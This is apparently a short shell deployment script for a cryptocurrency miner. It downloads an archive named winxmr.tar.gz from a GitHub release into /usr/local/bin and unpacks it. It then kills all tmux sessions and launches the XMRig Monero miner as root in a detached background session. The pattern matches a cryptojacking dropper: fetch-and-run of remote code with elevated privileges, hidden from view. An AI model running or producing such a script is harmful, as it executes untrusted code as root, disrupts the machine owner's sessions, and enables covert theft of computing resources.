#!/bin/sh
cd /usr/local/bin/
wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/winxmr.tar.gz
tar -zxvf winxmr.tar.gz
tmux kill-server
sleep 1
sudo tmux new-session -d -s SANS2 './xmrig-v5.11.1/xmrig'
